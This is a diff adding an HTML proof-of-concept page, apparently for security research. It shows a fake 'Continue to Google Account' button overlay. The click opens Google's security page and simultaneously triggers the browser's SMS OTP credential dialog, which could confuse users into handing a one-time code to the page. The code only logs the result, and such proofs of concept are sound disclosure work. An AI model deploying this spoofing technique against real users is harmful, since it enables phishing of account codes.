@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Research - Credential API</title>
+    <style>
+        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #ffffff; }
+        #overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; align-items: center; justify-content: center; cursor: pointer;
+        }
+        .login-btn {
+            display: flex; align-items: center; padding: 12px 24px;
+            background: #1a73e8; color: white; border-radius: 4px;
+            font-weight: 500; font-size: 14px; box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+    </style>
+</head>
+<body>
+
+    <div id="overlay">
+        <div class="login-btn">Lanjutkan ke Akun Google</div>
+    </div>
+
+    <script>
+        const overlay = document.getElementById('overlay');
+
+        overlay.addEventListener('click', async () => {
+            // 1. Persiapkan pemanggilan Credential API
+            // Kita menggunakan mode 'silent' atau 'mediation' untuk memicu UI sistem
+            const credentialOptions = {
+                otp: { transport: ['sms'] }, // Mencoba memicu dialog autofill OTP
+                mediation: 'required'
+            };
+
+            // 2. Eksekusi Navigasi & API secara simultan
+            // Kita picu navigasi ke halaman sensitif Google
+            window.open('https://myaccount.google.com/security', '_blank');
+
+            // 3. Panggil Credential API
+            // Dialog ini biasanya muncul dari bawah (Bottom Sheet) di Android
+            if (navigator.credentials) {
+                navigator.credentials.get(credentialOptions)
+                .then((creds) => {
+                    console.log("Credential received", creds);
+                })
+                .catch((err) => {
+                    console.log("Credential UI dismissed/blocked", err);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
